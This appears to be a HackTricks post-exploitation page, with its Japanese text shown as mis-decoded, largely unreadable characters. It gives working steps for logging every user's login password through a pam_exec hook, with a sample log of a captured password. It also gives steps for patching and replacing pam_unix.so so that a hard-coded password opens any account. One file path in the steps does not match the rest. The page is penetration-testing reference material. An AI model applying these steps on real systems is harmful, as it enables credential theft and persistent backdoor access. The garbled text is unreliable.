# Linuxã®ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

## PAMã‚’ä½¿ç”¨ã—ã¦ãƒ­ã‚°ã‚ªãƒ³ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°ã™ã‚‹

PAMãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’è¨­å®šã—ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ­ã‚°ã‚¤ãƒ³ã«ä½¿ç”¨ã™ã‚‹ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’è¨˜éŒ²ã—ã¾ã™ã€‚PAMãŒä½•ã‹ã‚ã‹ã‚‰ãªã„å ´åˆã¯ã€æ¬¡ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

ã¾ãšã€æ–°ã—ã„èªè¨¼ãŒè¡Œã‚ã‚Œã‚‹ãŸã³ã«å‘¼ã³å‡ºã•ã‚Œã‚‹bashã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½œæˆã—ã¾ã™ã€‚
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
```
å¤‰æ•°ã¯PAMå›ºæœ‰ã§ã‚ã‚Šã€`pam_exec.so`ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä»‹ã—ã¦åˆ©ç”¨ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

ä»¥ä¸‹ã¯å¤‰æ•°ã®æ„å‘³ã§ã™ï¼š

* **$PAM\_USER:** å…¥åŠ›ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼åã§ã™ã€‚
* **$PAM\_RHOST:** ãƒªãƒ¢ãƒ¼ãƒˆãƒ›ã‚¹ãƒˆï¼ˆé€šå¸¸ã¯IPã‚¢ãƒ‰ãƒ¬ã‚¹ï¼‰
* **$(cat -):** ã“ã‚Œã¯`stdin`ã‚’èª­ã¿å–ã‚Šã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒå–å¾—ã™ã‚‹ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¾ã™
* çµæœã¯`/var/log/toomanysecrets.log`ã«ãƒ­ã‚°ãƒ•ã‚¡ã‚¤ãƒ«ã¨ã—ã¦ãƒ‘ã‚¤ãƒ—ã•ã‚Œã¾ã™

ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒèª­ã‚ãªã„ã‚ˆã†ã«ã™ã‚‹**ã«ã¯ã€äº‹å‰ã«ä½œæˆã—ã¦`chmod`ã‚’å®Ÿè¡Œã—ã¦ãã ã•ã„ã€‚ä¾‹ï¼š
```bash
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
```
æ¬¡ã«ã€PAMã®è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ›´æ–°ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚`pam_exec`ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚

`/etc/pam.d/`ã«ã¯ã•ã¾ã–ã¾ãªè¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚ã‚Šã¾ã™ãŒã€`common-auth`ã‚’é¸æŠã—ã¾ã™ã€‚
```
sudo nano /etc/pam.d/common-auth
```
ãƒ•ã‚¡ã‚¤ãƒ«ã®ä¸€ç•ªä¸‹ã«ã€æ¬¡ã®èªè¨¼ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’è¿½åŠ ã—ã¦ãã ã•ã„ï¼š

`auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh`

ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã®æ„å‘³ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ï¼š

* **optional:** ã‚¨ãƒ©ãƒ¼ãŒã‚ã£ã¦ã‚‚èªè¨¼ã¯å¤±æ•—ã—ãªã„ï¼ˆå¿…é ˆã®ã‚¹ãƒ†ãƒƒãƒ—ã§ã¯ãªã„ï¼‰
* **pam\_exec.so:** ä»»æ„ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã‚‹ã€Living off the land PAMãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«
* **expose\_authtok:** `stdin`ã‚’ä»‹ã—ã¦ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’èª­ã¿å–ã‚‹ãŸã‚ã®ãƒˆãƒªãƒƒã‚¯
* **quiet:** ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¨ãƒ©ãƒ¼ã‚’è¡¨ç¤ºã—ãªã„ï¼ˆä½•ã‹ãŒã†ã¾ãã„ã‹ãªã„å ´åˆï¼‰
* æœ€å¾Œã®å¼•æ•°ã¯ä»¥å‰ä½œæˆã—ãŸã‚·ã‚§ãƒ«ã‚¹ã‚¯ãƒªãƒ—ãƒˆã§ã™

![](<../../.gitbook/assets/image (375).png>)

æœ€å¾Œã«ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å®Ÿè¡Œå¯èƒ½ã«ã—ã¾ã™ï¼š

`sudo chmod 700 /usr/local/bin/toomanysecrets.sh`

ã“ã‚Œã§ã€åˆ¥ã®ãƒã‚·ãƒ³ã‹ã‚‰sshã§æ¥ç¶šã™ã‚‹ã‹ã€ãƒ­ãƒ¼ã‚«ãƒ«ã§ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

ãã—ã¦ãƒ­ã‚°ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
```
$ sudo cat /var/log/toomanysecrets.log
Sun Jun 26 23:36:37 PDT 2022 tom, Trustno1!, From: 192.168.1.149
Sun Jun 26 23:37:53 PDT 2022 tom, Trustno1!, From:
Sun Jun 26 23:39:12 PDT 2022 tom, Trustno1!, From: 192.168.1.149
```
### PAMã®ãƒãƒƒã‚¯ãƒ‰ã‚¢è¨­å®š

PAMã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã«ç§»å‹•ã—ã¾ã—ã‚‡ã†ï¼ˆãƒ‡ã‚£ã‚¹ãƒˆãƒªãƒ“ãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚ˆã£ã¦ç•°ãªã‚Šã¾ã™ãŒã€è‡ªåˆ†ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã¨åŒã˜ã‚‚ã®ã‚’é¸æŠã—ã¦ãã ã•ã„ï¼‰ã€‚pam\_unix\_auth.cãƒ•ã‚¡ã‚¤ãƒ«ã®170/180è¡Œä»˜è¿‘ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚
```
vi modules/pam_unix/pam_unix_auth.c
```
![](<../../.gitbook/assets/image (651).png>)

ã“ã‚Œã‚’ä»¥ä¸‹ã®ã‚ˆã†ã«å¤‰æ›´ã—ã¾ã™ï¼š

![](<../../.gitbook/assets/image (638) (2) (2).png>)

ã“ã‚Œã«ã‚ˆã‚Šã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ "0xMitsurugi"** ã‚’ä½¿ç”¨ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚

`pam_unix_auth.c`ã‚’å†ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã—ã€pam\_unix.soãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç½®ãæ›ãˆã¾ã™ã€‚
```bash
make
sudo cp \
/home/mitsurugi/PAM/pam_deb/pam-1.1.8/modules/pam_unix/.libs/pam_unix.so \
/lib/x86_64-linux-gnu/security/
```
{% hint style="info" %}
ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã¯ã€[https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)ã‚’ä½¿ç”¨ã—ã¦è‡ªå‹•åŒ–ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

## å‚è€ƒæ–‡çŒ®

* [https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)
* [https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚„HackTricksã®PDFã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- **[ğŸ’¬](https://emojipedia.org/speech-balloon/) Discordã‚°ãƒ«ãƒ¼ãƒ—**ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
